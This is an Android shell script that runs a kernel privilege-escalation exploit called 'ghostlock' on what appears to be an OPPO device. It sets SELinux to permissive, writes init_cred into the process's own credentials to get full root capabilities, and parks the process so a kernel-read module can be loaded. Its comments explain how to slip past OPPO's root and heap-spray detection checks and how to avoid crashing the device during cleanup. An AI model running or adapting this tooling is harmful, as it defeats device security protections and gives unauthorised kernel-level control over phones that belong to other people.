#!/system/bin/sh
# W1 + W1c (self): SELinux permissive, then give *this* process root's full
# credential set by storing init_cred into its own real_cred/cred.
#
# Run it as uid 0 (the script only needs uid 0: it launches the binary and reads
# /proc).  The intended carrier is Magica's app-zygote root shell -- a service
# declared with useAppZygote=true whose zygote never dropped privileges, so the
# task is *born* uid 0.  That is what keeps the OPPO checks quiet:
#   * a task born uid 0 is invisible to both of them: oplus_heapspray_check
#     early-returns on current->cred->uid.val == 0 (`cbz w9,<epilogue>`) and
#     oplus_root_check_post_handler early-returns on a pre-syscall uid of 0, and
#     no set*uid() syscall happens for a delta check to observe;
#   * perf_event_open(pid=0) on the caller passes ptrace_may_access(), so the
#     task/comm leak needs no CAP_SYS_PTRACE -- which this shell does not have
#     (bounding set 0x8000c0), and which the old adbd target required.
#
#   GHOSTLOCK_SELF_ROOT=1      target self instead of adbd (perf pid=0)
#   GHOSTLOCK_W1C_ONLY=1       stop after the cred store + init_cred repair
#   GHOSTLOCK_PARK_AFTER_W1=1  keep the forged PI state alive
#
# After "W1c-only complete" the parked process is uid 0 with
# CapEff/CapPrm/CapBnd = 0x1ffffffffff, i.e. also CAP_SYS_MODULE.
#
# Loading kread_min.ko needs CAP_SYS_MODULE, which only the parked process has
# (this shell's bounding set is 0x8000c0), so the module must be loaded from
# *inside* that process -- not from here.  Once /proc/kread exists,
# cleanup-parked.sh can be driven from this shell; it needs no capabilities.
#
# DO NOT kill the parked process before cleanup-parked.sh reports "RESULT: clean":
# its exit walks the forged PI tree and wedges the machine (observed twice).

DIR=/data/local/tmp/gl-w1
LOG="$DIR/w1c-self.log"

cd "$DIR" || exit 1
export GHOSTLOCK_HOME="$DIR"
export GHOSTLOCK_MCAST_SOCKET=tcp6
export GHOSTLOCK_SELF_ROOT=1
export GHOSTLOCK_W1C_ONLY=1
export GHOSTLOCK_PARK_AFTER_W1=1

echo "W1c-self: before: uid=$(id -u) enforce=$(cat /sys/fs/selinux/enforce 2>/dev/null) caps=$(grep '^CapBnd' /proc/self/status)"

rm -f "$LOG"
setsid ./ghostlock --profile "$DIR/profile.bin" >"$LOG" 2>&1 &
PID=$!
echo "W1c-self: started pid=$PID -- log echoed below (also kept in $LOG)"

seen=0
i=0
while [ $i -lt 120 ]; do
    total=$(wc -l < "$LOG" 2>/dev/null)
    [ -z "$total" ] && total=0
    if [ "$total" -gt "$seen" ]; then
        tail -n +$((seen + 1)) "$LOG"
        seen=$total
    fi
    if grep -q "W1c-only complete" "$LOG" 2>/dev/null; then
        echo "W1c-self: DONE -- parked pid=$PID"
        grep -E '^(Uid|CapInh|CapPrm|CapEff|CapBnd|CapAmb)' "/proc/$PID/status" 2>/dev/null
        if grep -q '^CapBnd:.*000001ffffffffff' "/proc/$PID/status" 2>/dev/null; then
            echo "W1c-self: full caps confirmed (CapBnd 0x1ffffffffff)"
        else
            echo "W1c-self: WARNING CapBnd is still the app-zygote set -- check the"
            echo "          'W1c: firing init_cred repair' line and the kevent log"
        fi
        echo "W1c-self: parked process must NOT be killed before cleanup; next:"
        echo "  # module load needs CAP_SYS_MODULE, which only the parked process has,"
        echo "  # so it has to come from inside it (GHOSTLOCK_LOAD_KO=<path.ko>), not"
        echo "  # from this shell (bset 0x8000c0).  Once /proc/kread exists:"
        echo "  sh $DIR/cleanup-parked.sh            # dry run"
        echo "  sh $DIR/cleanup-parked.sh --apply    # clean, then the parked pid may exit"
        if [ -e /proc/kread ] && [ -x "$DIR/cleanup-parked.sh" ]; then
            echo "W1c-self: kread_min is up -- running the dry run now"
            sh "$DIR/cleanup-parked.sh"
        fi
        exit 0
    fi
    if [ "$i" -gt 5 ] && ! kill -0 "$PID" 2>/dev/null; then
        echo "W1c-self: process exited without completing -- last lines:"
        tail -12 "$LOG"
        exit 1
    fi
    sleep 1
    i=$((i + 1))
done

echo "W1c-self: still running after 120s (pid=$PID); see $LOG"
exit 2
